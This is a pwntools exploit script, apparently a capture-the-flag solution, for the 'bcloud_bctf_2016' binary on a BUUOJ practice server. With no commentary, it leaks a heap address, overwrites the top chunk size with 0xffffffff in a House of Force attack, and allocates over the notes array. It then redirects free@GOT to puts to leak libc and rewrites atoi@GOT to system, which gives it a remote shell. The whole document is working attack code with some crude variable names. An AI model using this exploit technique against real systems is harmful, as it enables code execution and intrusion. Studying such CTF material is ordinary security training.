from pwn import *
r = remote('node3.buuoj.cn',28471)
#r = process('./bcloud_bctf_2016')
elf = ELF('./bcloud_bctf_2016')
libc = ELF('./libc-2.23.so')
def add(size,content):
	r.sendlineafter('option--->>','1')
	r.sendlineafter('note content:',str(size))
	r.sendlineafter('content:',content)

def edit(index,content):
	r.sendlineafter('option--->>','3')
	r.sendlineafter('id:',str(index))
	r.sendlineafter('content:',content)

def free(index):
	r.sendlineafter('option--->>','4')
	r.sendlineafter('id:',str(index))

def syn():
	r.sendlineafter('option--->>','5')


atoi_got = elf.got['atoi']
free_got = elf.got['free']
puts_plt = elf.plt['puts']
log.info(hex(free_got))
log.info(hex(atoi_got))

r.recvuntil('Input your name:')
r.send('a'*0x40)
r.recvuntil('a'*0x40)
leak_heap = u32(r.recvuntil('!',drop=True))-8
log.success(hex(leak_heap))

r.recvuntil('Org:')
r.send('a'*0x40)
r.recvuntil('Host:')
r.sendline(p32(0xffffffff))

fuck_addr = 0x804B0A0
#note:0x804B120
size = -(leak_heap+3*0x48+0x10-fuck_addr)
add(size,'fuck')
add(0x400,p32(8)*32+p32(free_got)+p32(atoi_got)+p32(atoi_got))

edit(0,p64(puts_plt))
free(1)
r.recv(1)
atoi_leak = u32(r.recvuntil('\nDelete',drop=True))
libc_base = atoi_leak - libc.sym['atoi']
log.success(hex(libc_base))
system = libc_base + libc.sym['system']
edit(2,p32(system))
r.sendline('/bin/sh\x00')
r.interactive()